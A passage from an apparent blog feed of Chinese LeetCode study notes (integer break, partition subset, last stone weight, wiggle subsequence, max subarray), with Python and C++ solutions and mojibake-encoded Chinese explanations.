class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt;= n ; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= i / <span class="number">2</span>; j++) &#123;</span><br><span class="line">        dp[i] = max(dp[i], max((i - j) * j, dp[i - j] * j));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ‹†åˆ†ä¸€ä¸ªæ•°n ä½¿ä¹‹ä¹˜ç§¯æœ€å¤§ï¼Œé‚£ä¹ˆä¸€å®šæ˜¯æ‹†åˆ†æˆmä¸ªè¿‘ä¼¼ç›¸åŒçš„å­æ•°ç›¸ä¹˜æ‰æ˜¯æœ€å¤§çš„ã€‚<br>ä¾‹å¦‚ 6 æ‹†æˆ 3 * 3ï¼Œ 10 æ‹†æˆ 3 * 3 * 4ã€‚ 100çš„è¯ ä¹Ÿæ˜¯æ‹†æˆmä¸ªè¿‘ä¼¼æ•°ç»„çš„å­æ•° ç›¸ä¹˜æ‰æ˜¯æœ€å¤§çš„ã€‚<br>åªä¸è¿‡æˆ‘ä»¬ä¸çŸ¥é“mç©¶ç«Ÿæ˜¯å¤šå°‘è€Œå·²ï¼Œä½†å¯ä»¥æ˜ç¡®çš„æ˜¯mä¸€å®šå¤§äºç­‰äº2ï¼Œæ—¢ç„¶må¤§äºç­‰äº2ï¼Œä¹Ÿå°±æ˜¯ æœ€å·®ä¹Ÿåº”è¯¥æ˜¯æ‹†æˆä¸¤ä¸ªç›¸åŒçš„ å¯èƒ½æ˜¯æœ€å¤§å€¼ã€‚<br>é‚£ä¹ˆ j éå†ï¼Œåªéœ€è¦éå†åˆ° n&#x2F;2 å°±å¯ä»¥ï¼Œåé¢å°±æ²¡æœ‰å¿…è¦éå†äº†ï¼Œä¸€å®šä¸æ˜¯æœ€å¤§å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">integerBreak</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        dp = [<span class="number">0</span>] * (n+<span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i // <span class="number">2</span> + <span class="number">1</span>):</span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i], (i-j)*j, dp[i-j]*j)</span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></figure><h2 id="416-åˆ†å‰²ç­‰å’Œå­é›†"><a href="#416-åˆ†å‰²ç­‰å’Œå­é›†" class="headerlink" title="416. åˆ†å‰²ç­‰å’Œå­é›†"></a>416. åˆ†å‰²ç­‰å’Œå­é›†</h2><p>ç»™ä½ ä¸€ä¸ª åªåŒ…å«æ­£æ•´æ•° çš„ éç©º æ•°ç»„ nums ã€‚è¯·ä½ åˆ¤æ–­æ˜¯å¦å¯ä»¥å°†è¿™ä¸ªæ•°ç»„åˆ†å‰²æˆä¸¤ä¸ªå­é›†ï¼Œä½¿å¾—ä¸¤ä¸ªå­é›†çš„å…ƒç´ å’Œç›¸ç­‰ã€‚</p><p>è¾“å…¥ï¼šnums &#x3D; [1,5,11,5]<br>è¾“å‡ºï¼štrue<br>è§£é‡Šï¼šæ•°ç»„å¯ä»¥åˆ†å‰²æˆ [1, 5, 5] å’Œ [11] ã€‚</p><p>è¾“å…¥ï¼šnums &#x3D; [1,2,3,5]<br>è¾“å‡ºï¼šfalse<br>è§£é‡Šï¼šæ•°ç»„ä¸èƒ½åˆ†å‰²æˆä¸¤ä¸ªå…ƒç´ å’Œç›¸ç­‰çš„å­é›†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”¨ä¸€ç»´æ•°ç»„æ¥è®°å½•dpï¼Œdp[i]è¡¨ç¤ºå‰iä¸ªæ•°èƒ½å¦ç»„æˆå’Œä¸ºiçš„å­é›†ï¼Œéœ€è¦åå‘éå†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">canPartition</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">sum</span>(nums) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        target = <span class="built_in">sum</span>(nums) // <span class="number">2</span></span><br><span class="line">        dp = [<span class="number">0</span>] * (target + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(target, num-<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j], dp[j-num] + num)</span><br><span class="line">        <span class="keyword">return</span> dp[-<span class="number">1</span>] == target</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨äºŒç»´äºŒç»´æ•°ç»„æ¥è®°å½•dpï¼Œdp[i][j]è¡¨ç¤ºå‰iä¸ªæ•°èƒ½å¦ç»„æˆå’Œä¸ºjçš„å­é›†ï¼Œéœ€è¦æ­£å‘éå†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">canPartition</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        total_sum = <span class="built_in">sum</span>(nums)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> total_sum % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        target_sum = total_sum // <span class="number">2</span></span><br><span class="line">        dp = [[<span class="literal">False</span>] * (target_sum+<span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)+<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums) + <span class="number">1</span>):</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(nums)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, target_sum+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> j &lt; nums[i-<span class="number">1</span>]:</span><br><span class="line">                    <span class="comment"># å½“å‰æ•°å­—å¤§äºç›®æ ‡å’Œæ—¶ï¼Œæ— æ³•ä½¿ç”¨è¯¥æ•°å­—</span></span><br><span class="line">                    dp[i][j] = dp[i-<span class="number">1</span>][j]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># å½“å‰æ•°å­—å°äºç­‰äºç›®æ ‡å’Œæ—¶ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨æˆ–ä¸ä½¿ç”¨è¯¥æ•°å­—</span></span><br><span class="line">                    dp[i][j] = dp[i-<span class="number">1</span>][j] <span class="keyword">or</span> dp[i-<span class="number">1</span>][j-nums[i-<span class="number">1</span>]]</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="built_in">len</span>(nums)][target_sum]</span><br></pre></td></tr></table></figure><h2 id="1049-æœ€åä¸€å—çŸ³å¤´çš„é‡é‡-II"><a href="#1049-æœ€åä¸€å—çŸ³å¤´çš„é‡é‡-II" class="headerlink" title="1049. æœ€åä¸€å—çŸ³å¤´çš„é‡é‡ II"></a>1049. æœ€åä¸€å—çŸ³å¤´çš„é‡é‡ II</h2><p>æœ‰ä¸€å †çŸ³å¤´ï¼Œç”¨æ•´æ•°æ•°ç»„ stones è¡¨ç¤ºã€‚å…¶ä¸­ stones[i] è¡¨ç¤ºç¬¬ i å—çŸ³å¤´çš„é‡é‡ã€‚</p><p>æ¯ä¸€å›åˆï¼Œä»ä¸­é€‰å‡ºä»»æ„ä¸¤å—çŸ³å¤´ï¼Œç„¶åå°†å®ƒä»¬ä¸€èµ·ç²‰ç¢ã€‚å‡è®¾çŸ³å¤´çš„é‡é‡åˆ†åˆ«ä¸º x å’Œ yï¼Œä¸” x &lt;&#x3D; yã€‚é‚£ä¹ˆç²‰ç¢çš„å¯èƒ½ç»“æœå¦‚ä¸‹ï¼š</p><p>å¦‚æœ x &#x3D;&#x3D; yï¼Œé‚£ä¹ˆä¸¤å—çŸ³å¤´éƒ½ä¼šè¢«å®Œå…¨ç²‰ç¢ï¼›<br>å¦‚æœ x !&#x3D; yï¼Œé‚£ä¹ˆé‡é‡ä¸º x çš„çŸ³å¤´å°†ä¼šå®Œå…¨ç²‰ç¢ï¼Œè€Œé‡é‡ä¸º y çš„çŸ³å¤´æ–°é‡é‡ä¸º y-xã€‚<br>æœ€åï¼Œæœ€å¤šåªä¼šå‰©ä¸‹ä¸€å— çŸ³å¤´ã€‚è¿”å›æ­¤çŸ³å¤´ æœ€å°çš„å¯èƒ½é‡é‡ ã€‚å¦‚æœæ²¡æœ‰çŸ³å¤´å‰©ä¸‹ï¼Œå°±è¿”å› 0ã€‚</p><p>è¾“å…¥ï¼šstones &#x3D; [2,7,4,1,8,1]<br>è¾“å‡ºï¼š1<br>è§£é‡Šï¼š<br>ç»„åˆ 2 å’Œ 4ï¼Œå¾—åˆ° 2ï¼Œæ‰€ä»¥æ•°ç»„è½¬åŒ–ä¸º [2,7,1,8,1]ï¼Œ<br>ç»„åˆ 7 å’Œ 8ï¼Œå¾—åˆ° 1ï¼Œæ‰€ä»¥æ•°ç»„è½¬åŒ–ä¸º [2,1,1,1]ï¼Œ<br>ç»„åˆ 2 å’Œ 1ï¼Œå¾—åˆ° 1ï¼Œæ‰€ä»¥æ•°ç»„è½¬åŒ–ä¸º [1,1,1]ï¼Œ<br>ç»„åˆ 1 å’Œ 1ï¼Œå¾—åˆ° 0ï¼Œæ‰€ä»¥æ•°ç»„è½¬åŒ–ä¸º [1]ï¼Œè¿™å°±æ˜¯æœ€ä¼˜å€¼ã€‚</p><p>æœ¬é¢˜å…¶å®æ˜¯å°½é‡è®©çŸ³å¤´åˆ†æˆé‡é‡ç›¸åŒçš„ä¸¤å †ï¼ˆå°½å¯èƒ½ç›¸åŒï¼‰ï¼Œç›¸æ’ä¹‹åå‰©ä¸‹çš„çŸ³å¤´å°±æ˜¯æœ€å°çš„ã€‚<br>ä¸€å †çš„çŸ³å¤´é‡é‡æ˜¯sumï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°½å¯èƒ½æ‹¼æˆ é‡é‡ä¸º sum &#x2F; 2 çš„çŸ³å¤´å †ã€‚ è¿™æ ·å‰©ä¸‹çš„çŸ³å¤´å †ä¹Ÿæ˜¯ å°½å¯èƒ½æ¥è¿‘ sum&#x2F;2 çš„é‡é‡ã€‚ é‚£ä¹ˆæ­¤æ—¶é—®é¢˜å°±æ˜¯æœ‰ä¸€å †çŸ³å¤´ï¼Œæ¯ä¸ªçŸ³å¤´éƒ½æœ‰è‡ªå·±çš„é‡é‡ï¼Œæ˜¯å¦å¯ä»¥ è£…æ»¡ æœ€å¤§é‡é‡ä¸º sum &#x2F; 2çš„èƒŒåŒ…ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lastStoneWeightII</span>(<span class="params">self, stones: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        dp = [<span class="number">0</span>]*<span class="number">15001</span></span><br><span class="line">        total_sum = <span class="built_in">sum</span>(stones)</span><br><span class="line">        target = total_sum // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> stone <span class="keyword">in</span> stones:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(target, stone - <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j], dp[j-stone] + stone)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> total_sum - dp[target] - dp[target]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> åŠ¨æ€è§„åˆ’ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç®—æ³•ã€‘PythonæŠ€å·§</title>
      <link href="/2025/03/14/algorithm/fancypython/"/>
      <url>/2025/03/14/algorithm/fancypython/</url>
      
        <content type="html"><![CDATA[<p>nums.sort(key&#x3D;lambda x: abs(x), reverse&#x3D;True)</p><p>que.insert(p[1], p)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lambdaè¿”å›çš„æ˜¯ä¸€ä¸ªå…ƒç»„ï¼šå½“-x[0](ç»´åº¦hï¼‰ç›¸åŒæ—¶ï¼Œå†æ ¹æ®x[1]ï¼ˆç»´åº¦kï¼‰ä»å°åˆ°å¤§æ’åº</span></span><br><span class="line">people.sort(key=<span class="keyword">lambda</span> x:(-x[<span class="number">0</span>], x[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i,ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç®—æ³•ã€‘è´ªå¿ƒç®—æ³•</title>
      <link href="/2025/03/12/algorithm/Greedy/"/>
      <url>/2025/03/12/algorithm/Greedy/</url>
      
        <content type="html"><![CDATA[<h2 id="376-æ‘†åŠ¨åºåˆ—"><a href="#376-æ‘†åŠ¨åºåˆ—" class="headerlink" title="376. æ‘†åŠ¨åºåˆ—"></a>376. æ‘†åŠ¨åºåˆ—</h2><p>å¦‚æœè¿ç»­æ•°å­—ä¹‹é—´çš„å·®ä¸¥æ ¼åœ°åœ¨æ­£æ•°å’Œè´Ÿæ•°ä¹‹é—´äº¤æ›¿ï¼Œåˆ™æ•°å­—åºåˆ—ç§°ä¸º æ‘†åŠ¨åºåˆ— ã€‚ç¬¬ä¸€ä¸ªå·®ï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰å¯èƒ½æ˜¯æ­£æ•°æˆ–è´Ÿæ•°ã€‚ä»…æœ‰ä¸€ä¸ªå…ƒç´ æˆ–è€…å«ä¸¤ä¸ªä¸ç­‰å…ƒç´ çš„åºåˆ—ä¹Ÿè§†ä½œæ‘†åŠ¨åºåˆ—ã€‚<br>ä¾‹å¦‚ï¼Œ [1, 7, 4, 9, 2, 5] æ˜¯ä¸€ä¸ª æ‘†åŠ¨åºåˆ— ï¼Œå› ä¸ºå·®å€¼ (6, -3, 5, -7, 3) æ˜¯æ­£è´Ÿäº¤æ›¿å‡ºç°çš„ã€‚<br>ç›¸åï¼Œ[1, 4, 7, 2, 5] å’Œ [1, 7, 4, 5, 5] ä¸æ˜¯æ‘†åŠ¨åºåˆ—ï¼Œç¬¬ä¸€ä¸ªåºåˆ—æ˜¯å› ä¸ºå®ƒçš„å‰ä¸¤ä¸ªå·®å€¼éƒ½æ˜¯æ­£æ•°ï¼Œç¬¬äºŒä¸ªåºåˆ—æ˜¯å› ä¸ºå®ƒçš„æœ€åä¸€ä¸ªå·®å€¼ä¸ºé›¶ã€‚<br>å­åºåˆ— å¯ä»¥é€šè¿‡ä»åŸå§‹åºåˆ—ä¸­åˆ é™¤ä¸€äº›ï¼ˆä¹Ÿå¯ä»¥ä¸åˆ é™¤ï¼‰å…ƒç´ æ¥è·å¾—ï¼Œå‰©ä¸‹çš„å…ƒç´ ä¿æŒå…¶åŸå§‹é¡ºåºã€‚<br>ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums ï¼Œè¿”å› nums ä¸­ä½œä¸º æ‘†åŠ¨åºåˆ— çš„ æœ€é•¿å­åºåˆ—çš„é•¿åº¦ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [1,7,4,9,2,5]</span><br><span class="line">è¾“å‡ºï¼š6</span><br><span class="line">è§£é‡Šï¼šæ•´ä¸ªåºåˆ—å‡ä¸ºæ‘†åŠ¨åºåˆ—ï¼Œå„å…ƒç´ ä¹‹é—´çš„å·®å€¼ä¸º (6, -3, 5, -7, 3) ã€‚</span><br></pre></td></tr></table></figure><p>è€ƒè™‘ç”¨åŠ¨æ€è§„åˆ’çš„æ€æƒ³æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p>å¾ˆå®¹æ˜“å¯ä»¥å‘ç°ï¼Œå¯¹äºæˆ‘ä»¬å½“å‰è€ƒè™‘çš„è¿™ä¸ªæ•°ï¼Œè¦ä¹ˆæ˜¯ä½œä¸ºå±±å³°ï¼ˆå³ nums[i] &gt; nums[i-1]ï¼‰ï¼Œè¦ä¹ˆæ˜¯ä½œä¸ºå±±è°·ï¼ˆå³ nums[i] &lt; nums[i - 1]ï¼‰ã€‚</p><p>è®¾ dp çŠ¶æ€dp[i][0]ï¼Œè¡¨ç¤ºè€ƒè™‘å‰ i ä¸ªæ•°ï¼Œç¬¬ i ä¸ªæ•°ä½œä¸ºå±±å³°çš„æ‘†åŠ¨å­åºåˆ—çš„æœ€é•¿é•¿åº¦<br>è®¾ dp çŠ¶æ€dp[i][1]ï¼Œè¡¨ç¤ºè€ƒè™‘å‰ i ä¸ªæ•°ï¼Œç¬¬ i ä¸ªæ•°ä½œä¸ºå±±è°·çš„æ‘†åŠ¨å­åºåˆ—çš„æœ€é•¿é•¿åº¦<br>åˆ™è½¬ç§»æ–¹ç¨‹ä¸ºï¼š</p><p>dp[i][0] &#x3D; max(dp[i][0], dp[j][1] + 1)ï¼Œå…¶ä¸­0 &lt; j &lt; iä¸”nums[j] &lt; nums[i]ï¼Œè¡¨ç¤ºå°† nums[i]æ¥åˆ°å‰é¢æŸä¸ªå±±è°·åé¢ï¼Œä½œä¸ºå±±å³°ã€‚<br>dp[i][1] &#x3D; max(dp[i][1], dp[j][0] + 1)ï¼Œå…¶ä¸­0 &lt; j &lt; iä¸”nums[j] &gt; nums[i]ï¼Œè¡¨ç¤ºå°† nums[i]æ¥åˆ°å‰é¢æŸä¸ªå±±å³°åé¢ï¼Œä½œä¸ºå±±è°·ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è´ªå¿ƒç®—æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wiggleMaxLength</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(nums) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">len</span>(nums)</span><br><span class="line"></span><br><span class="line">        curDiff = <span class="number">0</span> <span class="comment"># å½“å‰ä¸€å¯¹å…ƒç´ çš„å·®å€¼</span></span><br><span class="line">        preDiff = <span class="number">0</span> <span class="comment"># å‰ä¸€å¯¹å…ƒç´ çš„å·®å€¼</span></span><br><span class="line">        result = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums) - <span class="number">1</span>):</span><br><span class="line">            curDiff = nums[i+<span class="number">1</span>] - nums[i] <span class="comment"># è®¡ç®—ä¸‹ä¸ªå…ƒç´ å’Œå½“å‰å…ƒç´ å·®å€¼</span></span><br><span class="line">            <span class="comment"># å¦‚æœé‡åˆ°ä¸€ä¸ªå³°å€¼</span></span><br><span class="line">            <span class="keyword">if</span> (preDiff &lt;= <span class="number">0</span> <span class="keyword">and</span> curDiff &gt; <span class="number">0</span>) <span class="keyword">or</span> (preDiff &gt;= <span class="number">0</span> <span class="keyword">and</span> curDiff &lt; <span class="number">0</span>):</span><br><span class="line">                result += <span class="number">1</span></span><br><span class="line">                preDiff = curDiff</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ¨æ€è§„åˆ’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wiggleMaxLength</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        dp = [[<span class="number">0</span>,<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums))] <span class="comment"># åˆ›å»ºäºŒç»´dpæ•°ç»„ï¼Œç”¨äºè®°å½•æ‘†åŠ¨åºåˆ—çš„æœ€å¤§é•¿åº¦</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">1</span> <span class="comment"># åˆå§‹æ¡ä»¶ï¼Œåºåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ é»˜è®¤ä¸ºå³°å€¼ï¼Œæœ€å°é•¿åº¦ä¸º1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(nums)):</span><br><span class="line">            dp[i][<span class="number">0</span>] = dp[i][<span class="number">1</span>] = <span class="number">1</span>  <span class="comment"># åˆå§‹åŒ–å½“å‰ä½ç½®çš„dpå€¼ä¸º1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                <span class="keyword">if</span> nums[j] &gt; nums[i]:</span><br><span class="line">                    dp[i][<span class="number">1</span>] = <span class="built_in">max</span>(dp[i][<span class="number">1</span>], dp[j][<span class="number">0</span>]+<span class="number">1</span>)  <span class="comment"># å¦‚æœå‰ä¸€ä¸ªæ•°æ¯”å½“å‰æ•°å¤§ï¼Œå¯ä»¥å½¢æˆä¸€ä¸ªä¸Šå‡å³°å€¼ï¼Œæ›´æ–°dp[i][1]</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                <span class="keyword">if</span> nums[j] &lt; nums[i]:</span><br><span class="line">                    dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i][<span class="number">0</span>], dp[j][<span class="number">1</span>]+<span class="number">1</span>) <span class="comment"># å¦‚æœå‰ä¸€ä¸ªæ•°æ¯”å½“å‰æ•°å°ï¼Œå¯ä»¥å½¢æˆä¸€ä¸ªä¸‹é™å³°å€¼ï¼Œæ›´æ–°dp[i][0]</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp[-<span class="number">1</span>][<span class="number">0</span>], dp[-<span class="number">1</span>][<span class="number">1</span>]) <span class="comment"># è¿”å›æœ€å¤§çš„æ‘†åŠ¨åºåˆ—é•¿åº¦</span></span><br></pre></td></tr></table></figure><h2 id="53-æœ€å¤§å­æ•°ç»„å’Œ"><a href="#53-æœ€å¤§å­æ•°ç»„å’Œ" class="headerlink" title="53. æœ€å¤§å­æ•°ç»„å’Œ"></a>53. æœ€å¤§å­æ•°ç»„å’Œ</h2><p>ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums ï¼Œè¯·ä½ æ‰¾å‡ºä¸€ä¸ªå…·æœ‰æœ€å¤§å’Œçš„è¿ç»­å­æ•°ç»„ï¼ˆå­æ•°ç»„æœ€å°‘åŒ…å«ä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œè¿”å›å…¶æœ€å¤§å’Œã€‚<br>å­æ•°ç»„æ˜¯æ•°ç»„ä¸­çš„ä¸€ä¸ªè¿ç»­éƒ¨åˆ†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxSubArray</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        result = <span class="built_in">float</span>(<span class="string">&#x27;-inf&#x27;</span>)</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            count += nums[i]</span><br><span class="line">            <span class="keyword">if</span> count &gt; result: <span class="comment"># å–åŒºé—´ç´¯è®¡çš„æœ€å¤§å€¼ï¼ˆç›¸å½“äºä¸æ–­ç¡®å®šæœ€å¤§å­åºç»ˆæ­¢ä½ç½®ï¼‰</span></span><br><span class="line">                result = count</span><br><span class="line">            <span class="keyword">if</span> count &lt;= <span class="number">0</span>: <span class="comment"># ç›¸å½“äºé‡ç½®æœ€å¤§å­åºèµ·å§‹ä½ç½®ï¼Œå› ä¸ºé‡åˆ°è´Ÿæ•°ä¸€å®šæ˜¯æ‹‰ä½æ€»å’Œ</span></span><br><span class="line">                count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="122-ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-II"><a href="#122-ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-II" class="headerlink" title="122.ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº II"></a>122.ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº II</h2><p>ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ prices ï¼Œå…¶ä¸­ prices[i] è¡¨ç¤ºæŸæ”¯è‚¡ç¥¨ç¬¬ i å¤©çš„ä»·æ ¼ã€‚<br>åœ¨æ¯ä¸€å¤©ï¼Œä½ å¯ä»¥å†³å®šæ˜¯å¦è´­ä¹°å’Œ&#x2F;æˆ–å‡ºå”®è‚¡ç¥¨ã€‚ä½ åœ¨ä»»ä½•æ—¶å€™ æœ€å¤š åªèƒ½æŒæœ‰ ä¸€è‚¡ è‚¡ç¥¨ã€‚ä½ 